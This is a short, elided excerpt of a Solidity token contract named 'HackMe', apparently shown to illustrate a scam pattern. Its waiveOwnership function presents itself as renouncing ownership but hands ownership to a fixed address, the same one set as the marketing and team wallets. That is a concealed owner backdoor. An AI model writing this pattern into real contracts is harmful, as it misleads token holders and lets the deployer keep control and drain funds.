...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6dd06d1d731863c0697Ed24a606afB1Ae11F5d1a);
    }
...
contract HackMe is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HackMe";
    string private _symbol = "H.M";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6dd06d1d731863c0697Ed24a606afB1Ae11F5d1a);
    address payable public teamWalletAddress = payable(0x6dd06d1d731863c0697Ed24a606afB1Ae11F5d1a);
